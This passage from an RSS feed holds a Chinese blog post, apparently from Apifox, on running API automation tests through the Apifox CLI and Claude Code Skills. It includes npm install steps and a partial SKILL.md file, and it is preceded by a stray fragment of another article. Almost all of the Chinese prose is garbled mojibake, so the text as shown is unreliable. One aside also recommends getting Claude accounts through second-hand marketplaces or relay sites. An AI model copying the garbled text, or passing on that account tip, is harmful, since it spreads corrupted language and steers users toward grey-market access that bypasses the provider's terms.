<li>ä½†æœ€ç»ˆä½ åˆ¤æ–­ç‰©ä½“å±äºå“ªä¸ªç±»åˆ«ï¼Œä¾æ®ä»ç„¶æ˜¯<strong>å“ªä¸ªç§¤çš„åŸå§‹è¯»æ•°æœ€å¤§</strong>ã€‚è¿™ä¸ªâ€œæ‰¾æœ€å¤§å€¼â€çš„å†³ç­–è§„åˆ™æ˜¯çº¿æ€§çš„ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Apifox CLI + Claude Skillsï¼šå°†æ¥å£è‡ªåŠ¨åŒ–æµ‹è¯•èå…¥ç ”å‘å·¥ä½œæµ]]></title>    <link>https://juejin.cn/post/7594722586732445702</link>    <guid>https://juejin.cn/post/7594722586732445702</guid>    <pubDate>2026-01-14T05:59:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594722586732445702" data-draft-id="7594863660296585258" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Apifox CLI + Claude Skillsï¼šå°†æ¥å£è‡ªåŠ¨åŒ–æµ‹è¯•èå…¥ç ”å‘å·¥ä½œæµ"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,æµ‹è¯•"/> <meta itemprop="datePublished" content="2026-01-14T05:59:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Apifox"/> <meta itemprop="url" content="https://juejin.cn/user/2766843870448222"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Apifox CLI + Claude Skillsï¼šå°†æ¥å£è‡ªåŠ¨åŒ–æµ‹è¯•èå…¥ç ”å‘å·¥ä½œæµ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2766843870448222/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Apifox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T05:59:55.000Z" title="Wed Jan 14 2026 05:59:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡æ—¨åœ¨ä»‹ç»å¦‚ä½•å°† Apifox CLI ä¸ Claude Skills ç»“åˆï¼Œå®ç° <strong>ã€Œè‡ªç„¶è¯­è¨€è§¦å‘æ¥å£è‡ªåŠ¨åŒ–æµ‹è¯•ã€</strong> çš„é«˜æ•ˆå·¥ä½œæµã€‚</p>
<p>åœ¨è¿™å¥—å·¥ä½œæµä¸­ï¼Œä½ åªéœ€è¦åœ¨ç»ˆç«¯é‡Œå¯¹ Claude Code è¯´ä¸€å¥è¯ï¼Œä¾‹å¦‚ï¼šâ€œç”¨å¼€å‘ç¯å¢ƒè·‘ä¸€ä¸‹æ”¯ä»˜æµç¨‹çš„æµ‹è¯•â€ã€‚</p>
<p>Claude Code å°±ä¼šè‡ªåŠ¨è¯†åˆ«ä½ çš„æ„å›¾ï¼Œå®šä½å¯¹åº”çš„â€œæµ‹è¯•åœºæ™¯â€æˆ–â€œæµ‹è¯•å¥—ä»¶â€æ¥æ‰§è¡Œæµ‹è¯•ã€‚æµ‹è¯•å®Œæˆåï¼Œå®ƒä¼šå¯¹æ‰§è¡Œç»“æœè¿›è¡Œæ•´ç†å’Œè§£è¯»ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3a558498a3344dca956668361768aa8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768975194&amp;x-signature=xdfNolY8dovPXONhZ2Js3gSQ9E4%3D" alt="" loading="lazy"/></p>
<p>è¿™å¥—æµç¨‹ç”±ä¸‰ä¸ªå·¥å…·ç»„æˆï¼š</p>
<ul>
<li>
<p><strong>Apifox CLIï¼š</strong> Apifox çš„å‘½ä»¤è¡Œå·¥å…·ã€‚ç”¨äºåœ¨ç»ˆç«¯ä¸­æ‰§è¡Œ CLI å‘½ä»¤ï¼Œå¹¶ç”Ÿæˆæµ‹è¯•æŠ¥å‘Šã€‚</p>
</li>
<li>
<p><strong>Claude Codeï¼š</strong> Anthropic æ¨å‡ºçš„å‘½ä»¤è¡Œ AI åŠ©æ‰‹ã€‚å¯ä»¥åœ¨ç»ˆç«¯æ“ä½œæ–‡ä»¶ã€è¿è¡Œå‘½ä»¤ã€æ‰§è¡Œè„šæœ¬ç­‰ã€‚</p>
</li>
<li>
<p><strong>Claude Skillsï¼š</strong> ä¹Ÿç§° Agent Skillsï¼Œæ˜¯ Claude Code çš„æ‰©å±•åŠŸèƒ½ã€‚å®ƒå¯ä»¥å®šä¹‰ Claude å¦‚ä½•å®Œæˆç‰¹å®šä»»åŠ¡ï¼Œç›¸å½“äºä¸€ä»½å¯æ‰§è¡Œçš„æ“ä½œè¯´æ˜ã€‚</p>
</li>
</ul>
<p>åœ¨è¿™å¥—æµç¨‹ä¸­ï¼ŒClaude Code è´Ÿè´£ç†è§£è‡ªç„¶è¯­è¨€æŒ‡ä»¤ï¼Œè‹¥â€œæŒ‡ä»¤â€åŒ¹é…åˆ°æœ¬å·¥ä½œæµä¸­é¢„ç½®çš„ Claude Skills åï¼Œå°±ä¼šè‡ªåŠ¨æ‰§è¡Œ Apifox CLI å‘½ä»¤å¹¶åˆ†ææ‰§è¡Œç»“æœã€‚</p>
<h2 data-id="heading-0">è¿™å¥—æµç¨‹èƒ½åšä»€ä¹ˆ</h2>
<p>ä¸‹é¢é€šè¿‡å‡ ä¸ªå®é™…æ“ä½œåœºæ™¯ï¼Œç›´è§‚äº†è§£è¿™å¥—å·¥ä½œæµçš„ä½¿ç”¨æ–¹å¼ï¼š</p>
<h3 data-id="heading-1">æ‰§è¡Œå•ä¸ªæµ‹è¯•</h3>
<p>å¦‚æœæƒ³æ‰§è¡Œç‰¹å®šçš„æµ‹è¯•åœºæ™¯ï¼Œå¯ä»¥ç›´æ¥æŒ‡å®šã€‚ä¾‹å¦‚ï¼Œåœ¨ Claude Code è¾“å…¥ï¼šâ€œå¸®æˆ‘è·‘ä¸€ä¸‹ç™»å½•åŠŸèƒ½çš„æµ‹è¯•ï¼Œç”¨å¼€å‘ç¯å¢ƒâ€ï¼Œæµ‹è¯•å®Œæˆå Claude ä¼šåˆ†æç»“æœå¹¶ç»™å‡ºæ€»ç»“ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1a25fc4aac84dcfbb26bef70028716e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768975194&amp;x-signature=dL%2FObeVCQfSUPM2ECoeCOMprUhk%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœæµ‹è¯•å¤±è´¥ï¼ŒClaude ä¼šåˆ†æå¤±è´¥åŸå› ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8568637529ad45efb69673b6a8451086~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768975194&amp;x-signature=LgFWtuSfWybhW%2BvpQh%2BVQv8wQxk%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">æŸ¥çœ‹æ‰€æœ‰å¯ç”¨æµ‹è¯•</h3>
<p>å¦‚æœæƒ³çŸ¥é“æœ‰å“ªäº›æµ‹è¯•åœºæ™¯æˆ–æµ‹è¯•å¥—ä»¶ï¼Œå¯ä»¥é—®ï¼šâ€œæœ‰å“ªäº›æµ‹è¯•å¯ä»¥æ‰§è¡Œï¼Ÿâ€ã€‚Claude å°±ä¼šè¿è¡Œç›¸å…³çš„è„šæœ¬ï¼ŒæŠŠæ‰€æœ‰æµ‹è¯•åˆ—å‡ºæ¥ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/118b3a31402d4e10bedcb023f932e168~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768975194&amp;x-signature=X0q2pJgIiiQIyUZ19qWkd6sRsAE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">æ‰§è¡ŒæŸä¸ªä¸šåŠ¡æ¨¡å—çš„æ‰€æœ‰æµ‹è¯•</h3>
<p>æƒ³æ‰§è¡ŒæŸä¸ªä¸šåŠ¡æ¨¡å—çš„æ‰€æœ‰æµ‹è¯•ï¼Œä¾‹å¦‚æƒ³ä¸€æ¬¡è·‘å®Œæ”¯ä»˜ç›¸å…³çš„æµ‹è¯•ï¼Œå¯ä»¥è¯´ï¼šâ€œç”¨æµ‹è¯•ç¯å¢ƒè·‘ä¸€ä¸‹æ”¯ä»˜ç›¸å…³çš„æ‰€æœ‰æµ‹è¯•â€ã€‚Claude ä¼šè‡ªåŠ¨æ‰¾åˆ°æ‰€æœ‰ç›¸å…³æµ‹è¯•æ–‡ä»¶å¹¶ä¾æ¬¡æˆ–è€…å¹¶è¡Œæ‰§è¡Œã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e188a6d3d144fa9ab3104931f0ce6a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768975194&amp;x-signature=gbQDpQ82v447%2BL80%2BSt73Ho5juE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">å¯¹æ¯”ä¸åŒç¯å¢ƒçš„æµ‹è¯•ç»“æœ</h3>
<p>å¦‚æœéœ€è¦å¯¹æ¯”ä¸åŒè¿è¡Œç¯å¢ƒçš„æµ‹è¯•ç»“æœï¼Œå¯ä»¥è¯´ï¼šâ€œç”¨å¼€å‘ç¯å¢ƒå’Œæµ‹è¯•ç¯å¢ƒè·‘ä¸€ä¸‹ç™»å½•åŠŸèƒ½çš„æµ‹è¯•â€ã€‚Claude ä¼šåœ¨ä¸¤ä¸ªç¯å¢ƒä¸‹æ‰§è¡Œæµ‹è¯•ï¼Œå¹¶å¸®ä½ åˆ†æç»“æœå·®å¼‚ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d05442e6a70144c7bb1b5fa9ddd019a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768975194&amp;x-signature=1qA7jR0luxTfhUzmGPwVsCKXtVU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">æ ¹æ®ä»£ç å˜æ›´æ‰§è¡Œæµ‹è¯•</h3>
<p>å½“ä»£ç æœ‰æ›´æ–°æ—¶ï¼Œå¯ä»¥è®© Claude åªæ‰§è¡Œå—å½±å“çš„æµ‹è¯•åœºæ™¯æˆ–æµ‹è¯•å¥—ä»¶ã€‚ä¾‹å¦‚ï¼šâ€œæ ¹æ®æœ€è¿‘çš„ä»£ç å˜æ›´ï¼Œåœ¨å¼€å‘ç¯å¢ƒè·‘ä¸€ä¸‹å—å½±å“çš„æ¥å£æµ‹è¯•â€ã€‚Claude ä¼šæ ¹æ® Git åˆ†æå˜æ›´æ–‡ä»¶ï¼Œå¹¶é€‰æ‹©å¯¹åº”æµ‹è¯•æ‰§è¡Œï¼ŒèŠ‚çœæ—¶é—´å’Œèµ„æºã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/361b7a9f39c64d6f9367fbe960df0744~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768975194&amp;x-signature=UUFarDsw1HyA87Te7UHT3WAFFNY%3D" alt="" loading="lazy"/></p>
<p>å…¶å®ƒæ›´å¤šåœºæ™¯ï¼Œéœ€è¦ä½ æ¥æ¢ç´¢......</p>
<p>ä¸‹é¢å°†ä¾æ¬¡ä»‹ç» Apifox CLIã€Claude Code å’Œ Claude Skills çš„å®‰è£…å’Œæ„å»ºæ–¹å¼ï¼Œä»¥åŠå¦‚ä½•å°†å®ƒä»¬ç»„åˆä½¿ç”¨ï¼Œæœ€ç»ˆè·‘é€šè¿™å¥—å·¥ä½œæµã€‚</p>
<h2 data-id="heading-6">å‡†å¤‡å·¥ä½œ</h2>
<h3 data-id="heading-7">ç¯å¢ƒè¦æ±‚</h3>
<p>ç¡®ä¿ç”µè„‘ä¸Šè£…äº† Node ç¯å¢ƒï¼Œå¯æ‰“å¼€ç»ˆç«¯éªŒè¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">node -v
npm -v
</code></pre>
<h3 data-id="heading-8">å®‰è£… Apifox CLI</h3>
<p>é€šè¿‡ npm å®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm install -g apifox-cli

apifox --version
</code></pre>
<p>çœ‹åˆ°ç‰ˆæœ¬å·è¯´æ˜å®‰è£…æˆåŠŸã€‚</p>
<p>å¯ä»¥åˆ° Apifox çš„ã€Œè‡ªåŠ¨åŒ–æµ‹è¯• -&gt; CI/CDã€ä¸­ï¼Œå¤åˆ¶ä¸€ä¸ªâ€œæµ‹è¯•åœºæ™¯â€æˆ–è€…â€œæµ‹è¯•å¥—ä»¶â€çš„ CLI å‘½ä»¤åˆ°ç»ˆç«¯æ‰§è¡Œï¼Œè®°å¾—æ·»åŠ  Access Tokenã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6037f2c1b1454a8a822db2903f764cc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXBpZm94:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768975194&amp;x-signature=suDTVVy39ceu%2B5CM6jQdBduV8ak%3D" alt="" loading="lazy"/></p>
<p>çœ‹åˆ°æµ‹è¯•è¾“å‡ºå°±è¯´æ˜ Apifox CLI èƒ½æ­£å¸¸å·¥ä½œäº†ã€‚</p>
<blockquote>
<p>ğŸ’¡ éœ€è¦å°† Apifox å®¢æˆ·ç«¯å’Œ Apifox CLI æ›´æ–°åˆ°æœ€æ–°ç‰ˆï¼Œæ‰èƒ½ä½¿ç”¨æœ€æ–°çš„â€œæµ‹è¯•å¥—ä»¶â€åŠŸèƒ½ã€‚</p>
</blockquote>
<h3 data-id="heading-9">å®‰è£… Claude Code</h3>
<p>é€šè¿‡ npm å®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm install -g @anthropic-ai/claude-code

claude --version
</code></pre>
<p>é¦–æ¬¡è¿è¡Œéœ€è¦ç™»å½•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">claude
</code></pre>
<p>æŒ‰ç…§æç¤ºå®Œæˆæˆæƒï¼Œéœ€è¦ Claude è´¦å· <em><span>ï¼ˆå¯ä»¥é€šè¿‡æŸé±¼æˆ–ä¸€äº›ä¸­è½¬ç«™è§£å†³è´¦å·é—®é¢˜ï¼‰</span></em> ã€‚ç™»å½•åä¼šè¿›å…¥å¯¹è¯ç•Œé¢ï¼Œè¯•è¯•é—®ä¸€äº›é—®é¢˜ï¼ŒClaude ä¼šç»™å‡ºå›ç­”ã€‚</p>
<p>ç°åœ¨ Claude è¿˜ä¸çŸ¥é“æ€ä¹ˆè·‘ Apifox æµ‹è¯•ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬é€šè¿‡ Claude Skills æ¥æ•™ä¼šå®ƒã€‚</p>
<h2 data-id="heading-10">Claude Skills çš„æ„å»º</h2>
<h3 data-id="heading-11">ç†è§£ Skills çš„å·¥ä½œåŸç†</h3>
<p>ä½¿ç”¨ Claude Code æ—¶ï¼Œä½ ä¸éœ€è¦æ‰‹åŠ¨æŒ‡å®šè¦ä½¿ç”¨çš„ Skillã€‚ä½ åªéœ€è¦ç”¨ä¸€å¥è¯æè¿°ä½ æƒ³åšçš„äº‹ï¼ŒClaude ä¼šè‡ªåŠ¨é€‰æ‹©åˆé€‚çš„ Skill æ¥å®Œæˆã€‚</p>
<p>åªè¦ä½ è¾“å…¥çš„è‡ªç„¶è¯­è¨€ä¸æŸä¸ª Skill çš„æè¿°ç›¸åŒ¹é…ï¼ŒClaude å°±ä¼šåŠ è½½è¯¥ Skillï¼Œå¹¶æŒ‰ç…§å…¶ä¸­å®šä¹‰çš„æµç¨‹æ‰§è¡Œä»»åŠ¡ã€‚</p>
<h3 data-id="heading-12">æ­¥éª¤ 1ï¼šåˆ›å»º Skill ç›®å½•</h3>
<p>Skills çš„é…ç½®æ–‡ä»¶ç»Ÿä¸€æ”¾åœ¨ <code>.claude/skills/</code> ç›®å½•ä¸‹ï¼Œæ¯ä¸ª Skill å¯¹åº”ä¸€ä¸ªç‹¬ç«‹çš„å­ç›®å½•ã€‚</p>
<p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹ï¼Œä¸º Apifox è‡ªåŠ¨åŒ–æµ‹è¯•åˆ›å»ºä¸€ä¸ªæœ€å°å¯ç”¨çš„ Skill ç›®å½•ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">mkdir -p .claude/skills/apifox-tests
</code></pre>
<p>æ‰§è¡Œå®Œæˆåï¼Œç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">.claude/skills/apifox-tests/
</code></pre>
<p>åç»­æˆ‘ä»¬ä¼šåœ¨è¿™ä¸ªç›®å½•ä¸­ï¼Œé€æ­¥æ·»åŠ  Skill çš„å…¥å£æ–‡ä»¶å’Œæ‰§è¡Œè„šæœ¬ç­‰å†…å®¹ã€‚</p>
<h3 data-id="heading-13">æ­¥éª¤ 2ï¼šåˆ›å»º SKILL.md</h3>
<p>æ¯ä¸ª Skill éƒ½éœ€è¦ä¸€ä¸ª <code>SKILL.md</code> æ–‡ä»¶ï¼Œç”¨æ¥è¯´æ˜å½“è¿™ä¸ª Skill è¢«åŒ¹é…åˆ°æ—¶ï¼ŒClaude åº”è¯¥å¦‚ä½•ä¸€æ­¥æ­¥å®Œæˆä»»åŠ¡ã€‚</p>
<p><code>SKILL.md</code> ä»¥ <code>---</code> åŒ…è£¹çš„ YAML å…ƒä¿¡æ¯å¼€å§‹ï¼Œå…¶ä¸­ <code>name</code> å’Œ <code>description</code> æ˜¯å¿…éœ€å­—æ®µã€‚</p>
<p><code>description</code> å°¤å…¶é‡è¦ï¼Œå®ƒç”¨äºå¸®åŠ© Claude åˆ¤æ–­åœ¨ä»€ä¹ˆåœºæ™¯ä¸‹åº”è¯¥å¯ç”¨è¿™ä¸ª Skillï¼Œæ‰€ä»¥è¿™é‡Œè¦æ ¹æ®ä½ çš„ä¸šåŠ¡å†™è§¦å‘æ¡ä»¶ã€‚</p>
<p>åœ¨ YAML ä¹‹åçš„ Markdown å†…å®¹ä¸­ï¼Œåˆ™ç”¨äºæè¿°è¿™ä¸ª Skill è¢«å¯ç”¨åï¼ŒClaude å…·ä½“åº”è¯¥æ€ä¹ˆåšï¼ŒåŒ…æ‹¬åˆ¤æ–­é€»è¾‘ã€æ‰§è¡Œæ­¥éª¤ã€å¼•ç”¨çš„è„šæœ¬ã€ä»¥åŠéœ€è¦éµå¾ªçš„çº¦æŸè§„åˆ™ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå¯ç›´æ¥ä½¿ç”¨çš„ <code>SKILL.md</code> ç¤ºä¾‹ï¼Œç”¨äºå®šä¹‰ Apifox è‡ªåŠ¨åŒ–æµ‹è¯•çš„æ‰§è¡Œæµç¨‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">---
name: apifox-tests
<span class="hljs-section">description: æ‰§è¡Œå’Œè§£è¯» Apifox è‡ªåŠ¨åŒ–æµ‹è¯•ã€‚è§¦å‘åœºæ™¯ï¼š(1) ä¿®æ”¹ä»£ç åéœ€è¦éªŒè¯æ¥å£å¯ç”¨æ€§ (2) git commit/push å‰çš„æ¥å£æ£€æŸ¥ (3) å‘å¸ƒç‰ˆæœ¬å‰çš„å›å½’æµ‹è¯• (4) ç”¨æˆ·æ˜ç¡®è¦æ±‚è¿è¡Œ Apifox æµ‹è¯•ï¼Œæˆ–ç”¨å…·ä½“ç¯å¢ƒè·‘ç›¸å…³æµ‹è¯• (5) åˆå¹¶åˆ° main åˆ†æ”¯å‰çš„è‡ªåŠ¨åŒ–æ£€æŸ¥ã€‚é€‰æ‹©åˆé€‚çš„æµ‹è¯•åœºæ™¯æˆ–è€…æµ‹è¯•å¥—ä»¶ï¼Œæ‰§è¡Œæµ‹è¯•å¹¶è§£é‡Šç»“æœï¼Œä½†ä¸ä¿®æ”¹æµ‹è¯•æˆ–å‘½ä»¤æœ¬èº«ã€‚
---</span>

<span class="hljs-section"># Apifox Tests</span>

æ‰§è¡Œ Apifox è‡ªåŠ¨åŒ–æµ‹è¯•å¹¶è§£é‡Šç»“æœã€‚

<span class="hljs-section">## å·¥ä½œæµç¨‹</span>

<span class="hljs-bullet">1.</span> <span class="hljs-strong">**é€‰æ‹©æµ‹è¯•**</span>ï¼š

<span class="hljs-bullet">-</span> å¦‚æœç”¨æˆ·åœ¨å¯¹è¯ä¸­æ˜ç¡®æä¾›äº†ï¼š
<span class="hljs-bullet">  -</span> æµ‹è¯•æ–‡ä»¶è·¯å¾„
<span class="hljs-bullet">  -</span> æµ‹è¯•æ–‡ä»¶å
<span class="hljs-bullet">  -</span> æˆ–æ¸…æ™°å¯å”¯ä¸€åŒ¹é…çš„æµ‹è¯•åç§°
<span class="hljs-bullet">-</span> ç›´æ¥ä½¿ç”¨è¯¥æµ‹è¯•ï¼Œä¸å†è¿›è¡Œè‡ªåŠ¨é€‰æ‹©
<span class="hljs-bullet">-</span> è‹¥ä¿¡æ¯ä¸æ˜ç¡®ï¼Œåº”ä¼˜å…ˆé€šè¿‡è¿è¡Œ <span class="hljs-code">`node ./.claude/skills/apifox-tests/scripts/list-tests.js`</span> è„šæœ¬æ¥å¿«é€Ÿè·å–æ‰€æœ‰çš„æµ‹è¯•æ–‡ä»¶è·¯å¾„åŠæè¿°ã€‚
<span class="hljs-bullet">-</span> é¿å…åœ¨åºå¤§çš„é¡¹ç›®ç›®å½•ä¸­è¿›è¡Œç›²ç›®çš„å…¨å±€æœç´¢ï¼Œç›´æ¥å®šä½åˆ°è¯¥ Skill ä¸“ç”¨çš„æµ‹è¯•æ–‡ä»¶ç›®å½• <span class="hljs-code">`tests/`</span>ã€‚

<span class="hljs-bullet">2.</span> <span class="hljs-strong">**å¤šæµ‹è¯•æ‰§è¡Œè§„åˆ™**</span>

<span class="hljs-bullet">-</span> é»˜è®¤åªæ‰§è¡Œä¸€ä¸ªæµ‹è¯•ï¼Œä½†éœ€ç»™å‡ºæ˜¯å¦æ‰¹é‡æ‰§è¡Œçš„é€‰æ‹©
<span class="hljs-bullet">-</span> å¦‚æœç”¨æˆ·æ˜ç¡®è¡¨ç¤ºï¼š
<span class="hljs-bullet">  -</span> â€œè·‘è¿™å‡ ä¸ªâ€
<span class="hljs-bullet">  -</span> â€œå…¨éƒ¨è·‘ä¸€éâ€
